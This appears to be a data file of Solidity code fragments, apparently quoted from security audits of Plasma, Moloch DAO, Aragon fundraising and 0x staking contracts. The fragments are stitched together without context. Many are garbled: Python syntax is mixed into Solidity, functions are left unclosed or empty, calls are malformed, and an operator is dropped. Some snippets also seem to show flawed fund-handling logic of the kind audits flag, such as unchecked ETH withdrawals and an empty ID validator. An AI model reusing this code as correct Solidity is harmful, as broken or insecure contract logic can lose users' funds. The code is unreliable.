the exit game contract\n * @param _protocol The transaction protocol, either 1 for MVP or 2 for MoreVP\n */\nfunction registerExitGame(uint256 _txType, address _contract, uint8 _protocol) public onlyFrom(getMaintainer()) {\n    require(_txType!= 0, ""Should not register with tx type 0"");\n    require(_contract!= address(0), ""Should not register with an empty exit game address"");\n    require(_exitGames[_txType] == address(0), ""The tx type is already registered"");\n    require(_exitGameToTxType[_contract] == 0, ""The exit game contract is already registered"");\n    require(Protocol.isValidProtocol(_protocol), ""Invalid protocol value"");\n\n    _exitGames[_txType] = _contract;\n    _exitGameToTxType[_contract] = _txType;\n    _protocols[_txType] = _protocol;\n    _exitGameQuarantine.quarantine(_contract);\n\n    emit ExitGameRegistered(_txType, _contract, _protocol);\n}\n```"
"```\nresult := mload(memPtr)\n```\n```\nreturn keccak256(\n    abi.encodePacked(\n        _txBytes,\n        _outputIndex,\n        _utxoPosValue\n    )\n)\n```\nreturn keccak256(\n    abi.encodePacked(\n        _txBytes,\n        _outputIndex\n    )\n)\n```\nbytes32 hashData = keccak256(abi.encodePacked(_txBytes, _utxoPos.value));\n```\n```\nreturn uint160(uint256(keccak256(_txBytes)) 105).setBit(151)\n```\n```\nbytes32 leafData = keccak256(data.txBytes);\n```"
"```\n/**\n * @notice Checks whether a transaction is ""standard finalized""\n */\nfunction isStandardFinalized(Model.Data memory data) public view returns (bool) {\n    if (data.protocol == Protocol.MORE_VP()) {\n        return checkInclusionProof(data);\n    } else if (data.protocol == Protocol.MVP()) {\n        revert(""MVP is not yet supported"");\n    } else {\n        revert(""Invalid protocol value"");\n    }\n}\n```\n```\nfunction isProtocolFinalized(Model.Data memory data) public view returns (bool) {\n    if (data.protocol == Protocol.MORE_VP()) {\n        return data.txBytes.length > 0;\n    } else if (data.protocol == Protocol.MVP()) {\n        revert(""MVP is not yet supported"");\n    } else {\n        revert(""Invalid protocol value"");\n    }\n}\n```\n```\nfunction checkInclusionProof(Model.Data memory data) private view returns (bool) {\n    if (data.inclusionProof.length == 0) {\n        return false;\n    }\n\n    (bytes32 root, ) = data.framework.blocks(data.txPos.blockNum());\n    bytes32 leafData = keccak256(data.txBytes);\n    return Merkle.checkMembership(\n        leafData,\n        data.txPos.txIndex(),\n        root,\n        data.inclusionProof\n    );\n}\n```\n```\nfunction verifyAndDeterminePositionOfTransactionIncludedInBlock(\n    bytes memory txbytes,\n    UtxoPosLib.UtxoPos memory utxoPos,\n    bytes32 root,\n    bytes memory inclusionProof\n)\n    private\n    pure\n    returns(uint256)\n{\n    bytes32 leaf = keccak256(txbytes);\n    require(\n        Merkle.checkMembership(leaf, utxoPos.txIndex(), root, inclusionProof),\n        ""Transaction is not included in block of Plasma chain""\n    );\n\n    return utxoPos.value;\n}\n```"
"```\n/**\n * @notice Checks that a leaf hash is contained in a root hash\n * @param leaf Leaf hash to verify\n * @param index Position of the leaf hash in the Merkle tree\n * @param rootHash Root of the Merkle tree\n * @param proof A Merkle proof demonstrating membership of the leaf hash\n * @return True, if the leaf hash is in the Merkle tree; otherwise, False\n */\nfunction checkMembership(bytes32 leaf, uint256 index, bytes32 rootHash, bytes memory proof)\n    internal\n    pure\n    returns (bool)\n{\n    require(proof.length % 32 == 0, ""Length of Merkle proof must be a multiple of 32"");\n\n    bytes32 proofElement;\n    bytes32 computedHash = leaf;\n    uint256 j = index;\n\n    for (uint256 i = 32; i <= proof.length; i += 32) {\n        proofElement = bytes32(keccak256(proof, i));\n        if (j % 2 == 0) {\n            computedHash = keccak256(abi.encodePacked(computedHash, proofElement));\n        } else {\n            computedHash = keccak256(abi.encodePacked(proofElement, computedHash));\n        }\n        j = j / 2;\n    }\n\n    return computedHash == rootHash;\n}\n```"
"```\n/**\n * @notice Registers an exit game within the PlasmaFramework. Only the maintainer can call the function.\n * @dev Emits ExitGameRegistered event to notify clients\n * @param _txType The tx type where the exit game wants to register\n * @param _contract Address of the exit game contract\n * @param _protocol The transaction protocol, either 1 for MVP or 2 for MoreVP\n */\nfunction registerExitGame(uint256 _txType, address _contract, uint8 _protocol) public onlyFrom(getMaintainer()) {\n    require(_txType!= 0, ""Should not register with tx type 0"");\n    require(_contract!= address(0), ""Should not register with an empty exit game address"");\n    require(_exitGames[_txType] == address(0), ""The tx type is already registered"");\n    require(_exitGameToTxType[_contract] == 0, ""The exit game contract is already registered"");\n    require(Protocol.isValidProtocol(_protocol), ""Invalid protocol value"");\n\n    _exitGames[_txType] = _contract;\n    _exitGameToTxType[_contract] = _txType;\n    _protocols[_txType] = _protocol;\n    _exitGameQuarantine.quarantine(_contract);\n\n    emit ExitGameRegistered(_txType, _contract, _protocol);\n}\n```\n```\nmodifier onlyFromNonQuarantinedExitGame() {\n    require(_exitGameToTxType[msg.sender]!= 0, ""The call is not from a registered exit game contract"");\n    require(!_exitGameQuarantine.isQuarantined(msg.sender), ""ExitGame is quarantined"");\n    _\n}\n```\n```\n/**\n * @notice Checks whether the contract is safe to use and is not under quarantine\n * @dev Exposes information about exit games quarantine\n * @param _contract Address of the exit game contract\n * @return boolean Whether the contract is safe to use and is not under quarantine\n */\nfunction isExitGameSafeToUse(address _contract) public view returns (bool) {\n    return _exitGameToTxType[_contract]!= 0 &&!_exitGameQuarantine.isQuarantined(_contract);\n}\n```\n```\nfunction withdraw(address payable receiver, address token, uint256 amount) external onlyFromNonQuarantinedExitGame {\n    IERC20(token).safeTransfer(receiver, amount);\n    emit Erc20Withdrawn(receiver, token, amount);\n}\n```\n```\nfunction withdraw(address payable receiver, uint256 amount) external onlyFromNonQuarantinedExitGame {\n    (bool success, ) = receiver.call.value(amount)("""");\n    if (success) {\n        emit EthWithdrawn(receiver, amount);\n    } else {\n        emit WithdrawFailed(receiver, amount);\n    }\n```\n```\nfunction activateNonReentrant() external onlyFromNonQuarantinedExitGame {\n    require(!mutex, ""Reentrant call"");\n    mutex = true;\n}\n```\n```\nfunction deactivateNonReentrant() external onlyFromNonQuarantinedExitGame {\n    require(mutex, ""Not locked"");\n    mutex = false;\n}\n```\n```\nfunction enqueue(\n    uint256 vaultId,\n    address token,\n    uint64 exitableAt,\n    TxPosLib.TxPos calldata txPos,\n    uint160 exitId,\n    IExitProcessor exitProcessor\n)\n    external\n    onlyFromNonQuarantinedExitGame\n    returns (uint256)\n{\n    bytes32 key = exitQueueKey(vaultId, token);\n    require(hasExitQueue(key), ""The queue for the (vaultId, token) pair is not yet added to the Plasma framework"");\n    PriorityQueue queue = exitsQueues[key];\n\n    uint256 priority = ExitPriority.computePriority(exitableAt, txPos, exitId);\n\n    queue.insert(priority);\n    delegations[priority] = exitProcessor;\n\n    emit ExitQueued(exitId, priority);\n    return priority;\n}\n```\n```\nfunction flagOutputSpent(bytes32 _outputId) external onlyFromNonQuarantinedExitGame {\n    require(_outputId!= bytes32(""""), ""Should not flag with empty outputId"");\n    isOutputSpent[_outputId] = true;\n}\n```"
```\nuint256 private withdrawEntryCounter = 0;\n```
"```\nif (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\n    return address(0);\n}\n\nif (v!= 27 && v!= 28) {\n    return address(0);\n}\n```\n```\naddress payable owner = inputTx.outputs[outputIndex].owner();\nrequire(\n    owner == ECDSA.recover(\n        eip712.hashTx(spendingTx),\n        signature\n    ),\n    ""Tx is not signed correctly""\n);\nreturn true;\n```"
"```\n(controller, uint256 blockTimestamp) = controller.framework.blocks(utxoPos.blockNum());\n```\n```\n(bytes32 root) = self.framework.blocks(utxoPos.blockNum())\n```\n```\n(controller, uint256 blockTimestamp) = controller.framework.blocks(utxoPos.blockNum());\n```\n```\n(bytes32 root,) = data.framework.blocks(data.txPos.blockNum())\n```"
```\nuint128 effectiveUpdateTime;\n```\n```\nuint64 constant public WAITING_PERIOD = 2 days;\n```\n```\nself.effective_update_time = uint64(now) + WAITING_PERIOD\n```
```\nprivate PlasmaFramework plasmaFramework;\n```\nprivate PlasmaFramework framework;\n```\nprivate PlasmaFramework framework;
"```\nif (!emergencyProcessing) {\n    require(\n        proposal.tributeToken.transfer(proposal.proposer, proposal.tributeOffered),\n        ""failing vote token transfer failed""\n    );\n}"
"```\nif (!emergencyProcessing) {\n    require(\n        proposal.tributeToken.transfer(proposal.proposer, proposal.tributeOffered),\n        ""failing vote token transfer failed""\n    );\n}"
"```\nfunction max(uint256 x, uint256 y) internal pure returns (uint256) {\n    return x >= y? x : y;\n}\n```"
"```\nfor (uint256 i = 0; i < tokens.length; i++) {\n    uint256 amountToRagequit = fairShare(userTokenBalances[GUILD][tokens[i]], sharesAndLootToBurn, initialTotalSharesAndLoot);\n    userTokenBalances[GUILD][tokens[i]] -= amountToRagequit;\n    userTokenBalances[memberAddress][tokens[i]] += amountToRagequit;\n}\n```"
"```\nif (proposal.flags[4]) {\n    require(!tokenWhitelist[address(proposal.tributeToken)], ""cannot already have whitelisted the token"");\n    require(!proposedToWhitelist[address(proposal.tributeToken)], 'already proposed to whitelist');\n    proposedToWhitelist[address(proposal.tributeToken)] = true;\n}\n```"
"```\nbool[6] flags; // [sponsored, processed, didPass, cancelled, whitelist, guildkick]\n```\n```\nbool[6] memory flags; // [sponsored, processed, didPass, cancelled, whitelist, guildkick]\n```"
"```\nfor (uint256 i = 0; i < redeemableTokens.length; i++) {\n    vaultTokenBalance = vault.balance(redeemableTokens[i]);\n\n    redemptionAmount = _burnableAmount.mul(vaultTokenBalance).div(burnableTokenTotalSupply);\n    totalRedemptionAmount = totalRedemptionAmount.add(redemptionAmount);\n\n    if (redemptionAmount > 0) {\n        vault.transfer(redeemableTokens[i], msg.sender, redemptionAmount);\n    }\n}\n```"
"```\nfunction _delayExecution(bytes _evmCallScript) internal returns (uint256) {\n    uint256 delayedScriptIndex = delayedScriptsNewIndex;\n    delayedScriptsNewIndex++;\n\n    delayedScripts[delayedScriptIndex] = DelayedScript(getTimestamp64().add(executionDelay), 0, _evmCallScript);\n\n    emit DelayedScriptStored(delayedScriptIndex);\n\n    return delayedScriptIndex;\n}\n```\n```\nfunction pauseExecution(uint256 _delayedScriptId) external auth(PAUSE_EXECUTION_ROLE) {\n    require(!isExecutionPaused(_delayedScriptId), ERROR_CANNOT_PAUSE);\n    delayedScripts[_delayedScriptId].pausedAt = getTimestamp64();\n\n    emit ExecutionPaused(_delayedScriptId);\n}\n```\n```\nfunction resumeExecution(uint256 _delayedScriptId) external auth(RESUME_EXECUTION_ROLE) {\n    require(_isExecutionPaused(_delayedScriptId), ERROR_CANNOT_RESUME);\n    DelayedScript storage delayedScript = delayedScripts[_delayedScriptId];\n\n    uint64 timePaused = getTimestamp64().sub(delayedScript.pausedAt);\n    delayedScript.executionTime = delayedScript.executionTime.add(timePaused);\n    delayedScript.pausedAt = 0;\n\n    emit ExecutionResumed(_delayedScriptId);\n}\n```"
"```\n/**\n * @dev Create a new MiniMe token and save it for the user\n * @param _name String with the name for the token used by share holders in the organization\n * @param _symbol String with the symbol for the token used by share holders in the organization\n */\nfunction newToken(string memory _name, string memory _symbol) public returns (MiniMeToken) {\n    MiniMeToken token = _createToken(_name, _symbol, TOKEN_DECIMALS);\n    _saveToken(token);\n    return token;\n}\n```\n```\n/**\n * @dev Deploy a Dandelion Org DAO using a previously saved MiniMe token\n * @param _id String with the name for org, will assign `[id].aragonid.eth`\n * @param _holders Array of token holder addresses\n * @param _stakes Array of token stakes for holders (token has 18 decimals, multiply token amount * 10^18)\n * @param _useAgentAsVault Boolean to tell whether to use an Agent app as a more advanced form of Vault app\n */\nfunction newBaseInstance(\n    string memory _id,\n    address[] memory _holders,\n    uint256[] memory _stakes,\n    uint64 _financePeriod,\n    bool _useAgentAsVault\n) public {\n    _validateId(_id);\n    _ensureBaseSettings(_holders, _stakes);\n\n    (Kernel dao, ACL acl) = _createDAO();\n    _setupBaseApps(dao, acl, _holders, _stakes, _financePeriod, _useAgentAsVault);\n}\n```\n```\nfunction _setupBaseApps(\n    Kernel _dao,\n    ACL _acl,\n    address[] memory _holders,\n    uint256[] memory _stakes,\n    uint64 _financePeriod,\n    bool _useAgentAsVault\n) internal {\n    MiniMeToken token = _getToken();\n    Vault agentOrVault = _useAgentAsVault? _installDefaultAgentApp(_dao) : _installVaultApp(_dao);\n    TokenManager tokenManager = _installTokenManagerApp(_dao, token, TOKEN_TRANSFERABLE, TOKEN_MAX_PER_ACCOUNT);\n    Finance finance = _installFinanceApp(_dao, agentOrVault, _financePeriod == 0? DEFAULT_Finance_PERIOD : _financePeriod);\n\n    _mintTokens(_acl, tokenManager, _holders, _stakes);\n    _saveBaseApps(_dao, finance, tokenManager, agentOrVault);\n    _saveAgentAsVault(_dao, _useAgentAsVault);\n}\n```\n```\nfunction _saveToken(MiniMeToken _token) internal {\n    DeployedContracts storage senderDeployedContracts = deployedContracts[msg.sender];\n\n    senderDeployedContracts.token = address(_token);\n}\n```\n```\nfunction _getToken() internal returns (MiniMeToken) {\n    DeployedContracts storage senderDeployedContracts = deployedContracts[msg.sender];\n    require(senderDeployedContracts.token!= address(0), ERROR_MISSING_TOKEN_CONTRACT);\n\n    MiniMeToken token = MiniMeToken(senderDeployedContracts.token);\n    return token;\n}\n```"
"```\n/**\n * @notice Execute the script with ID `_delayedScriptId`\n * @param _delayedScriptId The ID of the script to execute\n */\nfunction execute(uint256 _delayedScriptId) external {\n    require(canExecute(_delayedScriptId), ERROR_CAN_NOT_EXECUTE);\n    runScript(delayedScripts[_delayedScriptId].evmCallScript, new bytes(0), new address[](0));\n\n    delete delayedScripts[_delayedScriptId];\n\n    emit ExecutedScript(_delayedScriptId);\n}\n```"
```\nfunction cancelExecution(uint256 _delayedScriptId) external auth(CANCEL_EXECUTION_ROLE) {\n    delete delayedScripts[_delayedScriptId];\n\n    emit ExecutionCancelled(_delayedScriptId);\n}\n```
```\ndef _validateId(_id):\n    pass\n```
"```\n_createPermissions(\n    _acl,\n    grantees,\n    _fundraisingApps.bondedTokenManager,\n    _fundraisingApps.bondedTokenManager.MINT_ROLE(),\n    _owner\n)\n\n_acl.createPermission(\n    _fundraisingApps.marketMaker,\n    _fundraisingApps.bondedTokenManager,\n    _fundraisingApps.bondedTokenManager.BURN_ROLE(),\n    _owner\n)\n```\napp: anj-token-manager\n  role: MINT_ROLE\n  grantee: market-maker\n  manager: owner\n\napp: anj-token-manager\n  role: MINT_ROLE\n  grantee: presale\n  manager: owner\n\napp: anj-token-manager\n  role: BURN_ROLE\n  grantee: market-maker\n  manager: owner\n```\n```\n| App        | Permission                            | Grantee | Manager |\n| ---------- | ------------------------------------- | ------- | ------- |\n| Controller | UPDATE_BENEFICIARY                    | NULL    | NULL    |\n| Controller | UPDATE_FEES                           | NULL    | NULL    |\n| Controller | ADD_COLLATERAL_TOKEN                  | Owner   | Owner   |\n| Controller | REMOVE_COLLATERAL_TOKEN               | Owner   | Owner   |\n| Controller | UPDATE_COLLATERAL_TOKEN               | Owner   | Owner   |\n| Controller | UPDATE_MAXIMUM_TAP_RATE_INCREASE_PCT  | NULL    | NULL    |\n| Controller | UPDATE_MAXIMUM_TAP_FLOOR_DECREASE_PCT | NULL    | NULL    |\n| Controller | ADD_TOKEN_TAP                         | NULL    | NULL    |\n| Controller | UPDATE_TOKEN_TAP                      | NULL    | NULL    |\n| Controller | OPEN_PRESALE                          | Owner   | Owner   |\n| Controller | OPEN_TRADING                          | Presale | Owner   |\n| Controller | CONTRIBUTE                            | Any     | Owner   |\n| Controller | OPEN_BUY_ORDER                        | Any     | Owner   |\n| Controller | OPEN_SELL_ORDER                       | Any     | Owner   |\n| Controller | WITHDRAW                              | NULL    | NULL    |\n```\n```\n_acl.createPermission(_owner, _fundraisingApps.controller, _fundraisingApps.controller.UPDATE_BENEFICIARY_ROLE(), _owner)\n_acl.createPermission(_owner, _fundraisingApps.controller, _fundraisingApps.controller.UPDATE_FEES_ROLE(), _owner)\n```"
```\nbytes32 private constant PRESALE_ID = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;\n```\n```\nbytes32 private constant PRESALE_ID = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;\n```
"```\nfunction setPeriod(uint64 _period) external auth(OPEN_ROLE) {\n    _setPeriod(_period);\n}\n```\n```\nfunction _setPeriod(uint64 _period) internal {\n    require(_period > 0, ERROR_TIME_PERIOD_ZERO);\n    require(openDate == 0 || openDate + _period > getTimestamp64(), ERROR_INVALID_TIME_PERIOD);\n    period = _period;\n}\n```"
"```\nfunction _setPeriod(uint64 _period) internal {\n    require(_period > 0, ERROR_TIME_PERIOD_ZERO);\n    require(openDate == 0 || openDate + _period > getTimestamp64(), ERROR_INVALID_TIME_PERIOD);\n    period = _period;\n}\n```"
"```\nfunction _cacheFundraisingApps(\n    address _reserve,\n    address _presale,\n    address _marketMaker,\n    address _tap,\n    address _controller,\n    address _tokenManager\n)\n    internal\n    returns (FundraisingApps memory fundraisingApps)\n{\n    fundraisingApps.reserve = _reserve;\n    fundraisingApps.presale = _presale;\n    fundraisingApps.marketMaker = _marketMaker;\n    fundraisingApps.tap = _tap;\n    fundraisingApps.controller = _controller;\n    fundraisingApps.bondedTokenManager = _tokenManager;\n}\n\nfunction _cacheFundraisingParams(\n    address _owner,\n    string memory _id,\n    ERC20 _collateralToken,\n    MiniMeToken _bondedToken,\n    uint64 _period,\n    uint256 _exchangeRate,\n    uint64 _openDate,\n    uint256 _reserveRatio,\n    uint256 _batchBlocks,\n    uint256 _slippage\n)\n    internal\n    returns (FundraisingParams memory fundraisingParams)\n{\n    fundraisingParams = FundraisingParams({\n        owner: _owner,\n        id: _id,\n        collateralToken: _collateralToken,\n        bondedToken: _bondedToken,\n        period: _period,\n        exchangeRate: _exchangeRate,\n        openDate: _openDate,\n        reserveRatio: _reserveRatio,\n        batchBlocks: _batchBlocks,\n        slippage: _slippage\n    });\n}\n```"
"```\nfunction _cacheFundraisingParams(\n    address _owner,\n    string _id,\n    ERC20 _collateralToken,\n    MiniMeToken _bondedToken,\n    uint64 _period,\n    uint256 _exchangeRate,\n    uint64 _openDate,\n    uint256 _reserveRatio,\n    uint256 _batchBlocks,\n    uint256 _slippage\n)\n    internal\n    returns (FundraisingParams fundraisingParams)\n```\n```\nfunction _cacheFundraisingApps(\n    Agent _reserve,\n    Presale _presale,\n    MarketMaker _marketMaker,\n    Tap _tap,\n    Controller _controller,\n    TokenManager _tokenManager\n) internal returns (FundraisingApps memory fundraisingApps) {\n    fundraisingApps.reserve = _reserve;\n    fundraisingApps.presale = _presale;\n    fundraisingApps.marketMaker = _marketMaker;\n    fundraisingApps.tap = _tap;\n    fundraisingApps.controller = _controller;\n    fundraisingApps.bondedTokenManager = _tokenManager;\n}\n```"
"```\ncontract EOPBCTemplate is\n    EtherTokenConstant,\n    BaseTemplate {\n```"
```\nif (name(stake.left_) == key):\n    current.right_ = stake.right_\n    current.after_ = stake.after_\nelse:\n    current.left_ = stake.left_\n    current.before_ = stake.before_\n```
"```\nfunction good(bytes calldata shared, address target, bytes calldata receipt) external pure returns (bool) {\n}"
"```\nfunction lift(bytes32 key, Stake storage stake, uint128 amount, address stakee, address staker) private {\n```"
"```\nlift(key, stake, -amount, stakee, staker)\n```\n```\nstep(key, stake, current.amount, current.parent)\n```"
"```\nif (name(stake.left_) == key):\n    stake.before_ += amount\nelse:\n    stake.after_ += amount\n```\n```\nuint128 local = stake.amount_;\nlocal += amount;\nstake.amount_ = local;\nemit Update(staker, stakee, local);\n\nuint128 global = stakees_[stakee].amount_;\nglobal += amount;\nstakees_[stakee].amount_ = global;\n```\n```\nreturn stake.before_ + stake.after_ + stake.amount_;\n```"
"```\nif (fee > 0):\n    reserve.transfer(_collateral, beneficiary, fee)\n```"
"```\nfunction updateFormula(IBancorFormula _formula) external auth(UPDATE_FORMULA_ROLE) {\n    require(isContract(_formula), ERROR_CONTRACT_IS_EOA);\n\n    _updateFormula(_formula);\n}\n```"
"```\nfunction _slippageIsValid(\n    Batch storage _batch,\n    address _collateral\n) internal view returns (bool) {\n    uint256 staticPricePPM = _staticPricePPM(_batch.supply, _batch.balance, _batch.reserveRatio);\n    uint256 maximumSlippage = collaterals[_collateral].slippage;\n}"
"```\nfor (uint256 i = 0; i < _toReset.length; i++) {\n    require(_tokenIsContractOrETH(_toReset[i]), ERROR_INVALID_TOKENS);\n    toReset.push(_toReset[i]);\n}\n```\n```\nfunction openTrading() external auth(OPEN_TRADING_ROLE) {\n    for (uint256 i = 0; i < toReset.length; i++) {\n        tap.resetTappedToken(toReset[i]);\n    }\n    marketMaker.open();\n}\n```"
"```\nfunction _poolBalanceIsSufficient(address _collateral) internal view returns (bool) {\n    return controller.balanceOf(address(reserve), _collateral) >= collateralsToBeClaimed[_collateral];\n}\n```\n```\nfunction balanceOf(address _who, address _token) public view isInitialized returns (uint256) {\n    uint256 balance = _token == ETH? _who.balance : ERC20(_token).staticBalanceOf(_who);\n\n    if (_who == address(reserve)) {\n        return balance.sub(tap.getMaximumWithdrawal(_token));\n    } else {\n        return balance;\n    }\n}\n```\n```\nfunction _tappedAmount(address _token) internal view returns (uint256) {\n    uint256 toBeKept = controller.collateralsToBeClaimed(_token).add(floors[_token]);\n    uint256 balance = _token == ETH\n       ? address(reserve).balance\n        : ERC20(_token).staticBalanceOf(reserve);\n    uint256 flow = (_currentBatchId().sub(lastTappedAmountUpdates[_token])).mul(rates[_token]);\n    uint256 tappedAmount = tappedAmounts[_token].add(flow);\n\n    if (balance <= toBeKept) {\n        return 0;\n    }\n\n    if (balance <= toBeKept.add(tappedAmount)) {\n        return balance.sub(toBeKept);\n    }\n\n    return tappedAmount;\n}"
"```\nfunction contribute(address _contributor, uint256 _value) external payable nonReentrant auth(CONTRIBUTE_ROLE) {\n    require(state() == State.Funding, ERROR_INVALID_STATE);\n\n    if (contributionToken == ETH) {\n        require(msg.value == _value, ERROR_INVALID_CONTRIBUTE_VALUE);\n    } else {\n        require(msg.value == 0, ERROR_INVALID_CONTRIBUTE_VALUE);\n    }\n```\n```\nrequire(\n    ERC20(_token).safeTransfer(_to, _amount),\n    ERROR_TOKEN_TRANSFER_REVERTED\n);"
"```\nuint256 fee = _value.mul(buyFeePct).div(PCT_BASE);\nuint256 value = _value.sub(fee);\n\nif (fee > 0) {\n    _transfer(_buyer, beneficiary, _collateral, fee);\n}\n_transfer(_buyer, address(reserve), _collateral, value);\n```"
"```\n/**\n * @notice Update controller to `_controller`\n * @param _controller The address of the new controller contract\n*/\nfunction updateController(IAragonFundraisingController _controller) external auth(UPDATE_CONTROLLER_ROLE) {\n    require(isContract(_controller), ERROR_CONTRACT_IS_EOA);\n\n    _updateController(_controller);\n}\n```"
"```\n/**\n * @notice Update reserve to `_reserve`\n * @param _reserve The address of the new reserve [pool] contract\n*/\nfunction updateReserve(Vault _reserve) external auth(UPDATE_RESERVE_ROLE) {\n    require(isContract(_reserve), ERROR_CONTRACT_IS_EOA);\n\n    _updateReserve(_reserve);\n}\n```"
"```\nif (_openDate!= 0) {\n    _setOpenDate(_openDate);\n}\n```\n```\nfunction open() external auth(OPEN_ROLE) {\n    require(state() == State.Pending, ERROR_INVALID_STATE);\n\n    _open();\n}\n```"
"```\nfunction contribute(address _contributor, uint256 _value) external payable nonReentrant auth(CONTRIBUTE_ROLE) {\n    require(state() == State.Funding, ERROR_INVALID_STATE);\n\n    if (contributionToken == ETH) {\n        require(msg.value == _value, ERROR_INVALID_CONTRIBUTE_VALUE);\n    } else {\n        require(msg.value == 0, ERROR_INVALID_CONTRIBUTE_VALUE);\n    }\n\n    _contribute(_contributor, _value);\n}\n```"
"```\nacl.createPermission(this, controller, controller.ADD_COLLATERAL_TOKEN_ROLE(), this)"
"```\nacl.createPermission(this, controller, controller.ADD_COLLATERAL_TOKEN_ROLE(), this)\n```\n_transferPermissionFromTemplate(\n    acl,\n    controller,\n    shareVoting,\n    controller.ADD_COLLATERAL_TOKEN_ROLE(),\n    shareVoting\n)"
"```\nconstructor(\n    DAOFactory _daoFactory,\n    ENS _ens,\n    MiniMeTokenFactory _miniMeFactory,\n    IFIFSResolvingRegistrar _aragonID,\n    address _dai,\n    address _ant\n) public {\n    BaseTemplate(_daoFactory, _ens, _miniMeFactory, _aragonID);\n\n    _ensureAragonIdIsValid(_aragonID);\n    _ensureMiniMeFactoryIsValid(_miniMeFactory);\n    _ensureTokenIsContractOrETH(_dai);\n    _ensureTokenIsContractOrETH(_ant);\n\n    collaterals.push(address(_dai));\n    collaterals.push(address(_ant));\n}\n```"
"```\n_ensureTokenIsContractOrETH(_dai)\n_ensureTokenIsContractOrETH(_ant)\n```\n```\nfunction _ensureTokenIsContractOrETH(address _token) internal view returns (bool) {\n    require(isContract(_token) || _token == ETH, ERROR_BAD_SETTINGS);\n}\n```"
"```\n_poolById[poolId].numberOfMakers = uint256(pool.numberOfMakers).safeAdd(1).downcastToUint32()\n```\n```\nbytes32 makerPoolId = getStakingPoolIdOfMaker(makerAddress);\nif (makerPoolId!= poolId) {\n    LibRichErrors.revert(\n        LibStakingRichErrors.MakerPoolAssignmentError(\n            LibStakingRichErrors.MakerPoolAssignmentErrorCodes.MakerAddressNotRegistered,\n            makerAddress,\n            makerPoolId\n        )\n    );\n}\n```\n```\ndelete _poolJoinedByMakerAddress[makerAddress];\n_poolById[poolId].numberOfMakers = uint256(_poolById[poolId].numberOfMakers).safeSub(1).downcastToUint32()\n```"
"```\n(bool didInitSucceed, bytes memory initReturnData) = stakingContract.delegatecall(\n    abi.encodeWithSelector(IStorageInit(0).init.selector)\n);\nif (!didInitSucceed) {\n    assembly {\n        revert(add(initReturnData, 0x20), mload(initReturnData))\n    }\n}\n\nassert _assertValidStorageParams();\n```"
"```\nfunction setReadOnlyMode(bool shouldSetReadOnlyMode)\n    external\n    onlyAuthorized\n{\n    uint96 timestamp = block.timestamp.downcastToUint96();\n    if (shouldSetReadOnlyMode) {\n        stakingContract = readOnlyProxy;\n        readOnlyState = IStructs.ReadOnlyState({\n            isReadOnlyModeSet: true,\n            lastSetTimestamp: timestamp\n        });\n}\n```"
"```\n_poolById[poolId].numberOfMakers = uint256(_poolById[poolId].numberOfMakers).safeSub(1).downcastToUint32()\n```\n```\npoolJoinStatus = IStructs.MakerPoolJoinStatus({\n    poolId: poolId,\n    confirmed: true\n})\n\n_poolJoinedByMakerAddress[makerAddress] = poolJoinStatus\n_poolById[poolId].numberOfMakers = uint256(pool.numberOfMakers).safeAdd(1).downcastToUint32()\n```\n```\ndelete _poolJoinedByMakerAddress[makerAddress];\n_poolById[poolId].numberOfMakers = uint256(_poolById[poolId].numberOfMakers).safeSub(1).downcastToUint32()\n```"
```\nfunction getStakingPoolIdOfMaker(address makerAddress)\n    public\n    view\n    returns (bytes32)\n{\n    IStructs.MakerPoolJoinStatus memory poolJoinStatus = _poolJoinedByMakerAddress[makerAddress];\n    if (poolJoinStatus.confirmed) {\n        return poolJoinStatus.poolId;\n    } else {\n        return NIL_POOL_ID;\n    }\n}\n```
"```\nfunction _add(int256 a, int256 b) private pure returns (int256 c) {\n    c = a + b;\n    if (c > 0 && a < 0 && b < 0) {\n        LibRichErrors.rrevert(LibFixedMathRichErrors.BinOpError(\n            LibFixedMathRichErrors.BinOpErrorCodes.SUBTRACTION_OVERFLOW,\n            a,\n            b\n        ));\n    }\n    if (c < 0 && a > 0 && b > 0) {\n        LibRichErrors.rrevert(LibFixedMathRichErrors.BinOpError(\n            LibFixedMathRichErrors.BinOpErrorCodes.ADDITION_OVERFLOW,\n            a,\n            b\n        ));\n    }\n}\n```\n```\nfunction _mul(int256 a, int256 b) private pure returns (int256 c) {\n    if (a == 0) {\n        return 0;\n    }\n    c = a * b;\n    if (c / a!= b) {\n        LibRichErrors.revert(LibFixedMathRichErrors.BinOpError(\n            LibFixedMathRichErrors.BinOpErrorCodes.MULTIPLICATION_OVERFLOW,\n            a,\n            b\n        ));\n    }\n}\n```\n```\nfunction _div(int256 a, int256 b) private pure returns (int256 c) {\n    if (b == 0) {\n        LibRichErrors.revert(LibFixedMathRichErrors.BinOpError(\n            LibFixedMathRichErrors.BinOpErrorCodes.DIVISION_BY_ZERO,\n            a,\n            b\n        ));\n    }\n    c = a / b;\n}\n```"
"```\nif (from.status == IStructs.StakeStatus.DELEGATED):\n    _undelegateStake(\n        from.poolId,\n        staker,\n        amount\n    )\n\nif (to.status == IStructs.StakeStatus.DELEGATED):\n    _delegateStake(\n        to.poolId,\n        staker,\n        amount\n    )\n```\n```\nif (_arePointersEqual(fromPtr, toPtr)):\n    return\n```\n```\nemit MoveStake(\n    staker,\n    amount,\n    uint8(from.status),\n    from.poolId,\n    uint8(to.status),\n    to.poolId\n)"
```\nbool isInitialized;\n```\n```\nbool initialized;\n```
```\nbytes32 constant internal INITIAL_POOL_ID = 0x0000000000000000000000000000000100000000000000000000000000000000;\n\nuint256 constant internal POOL_ID_INCREMENT_AMOUNT = 0x0000000000000000000000000000000100000000000000000000000000000000;\n```\n```\nfunction _computeNextStakingPoolId(bytes32 poolId)\n    internal\n    pure\n    returns (bytes32)\n{\n    return bytes32(uint256(poolId).safeAdd(POOL_ID_INCREMENT_AMOUNT));\n}\n```
"```\nassembly {\n    let freeMemPtr := 0\n    if gt(customEgressSelector, 0) {\n        mstore(0x0, customEgressSelector)\n        freeMemPtr := add(freeMemPtr, 4)\n    }\n\n    let calldataOffset := 0\n    if gt(ignoreIngressSelector, 0) {\n        calldataOffset := 4\n    }\n\n    calldatacopy(\n        freeMemPtr,\n        calldataOffset,\n        calldatasize()\n    )\n}\n```"
